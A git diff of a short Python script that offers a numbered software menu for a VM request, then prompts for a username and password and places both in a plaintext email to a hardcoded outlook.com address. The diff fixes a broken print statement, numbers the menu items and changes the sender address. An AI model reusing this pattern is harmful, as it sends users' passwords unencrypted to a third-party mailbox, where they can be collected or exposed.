@@ -7,11 +7,11 @@ print("1. Microsoft 365")
 print("2. Unity")
 print("3. Roblox Studio")
 print("4. Visual Studio Code")
-print("Github Desktop)
-print("Adobe Creative Cloud")
-print("Blender")           
-print("Adobe Premiere Pro")
-print("Adobe After Effects")
+print("5. Github Desktop")
+print("6. Adobe Creative Cloud")
+print("7. Blender")           
+print("8. Adobe Premiere Pro")
+print("9. Adobe After Effects")
 # Get the user's choices
 choices = input("Enter your choices (e.g., 1,2,3): ").split(",")
 
@@ -34,7 +34,7 @@ username = input("Enter your username: ")
 password = input("Enter your password: ")
 
 # Email details
-sender_email = "VCM@TheVCMProject.com"
+sender_email = "thecodeproject@outlook.com"
 receiver_email = "thecodeProject@outlook.com"
 subject = "VM Details"
 message = f"Software: {', '.join(software)}\nUsername: {username}\nPassword: {password}"
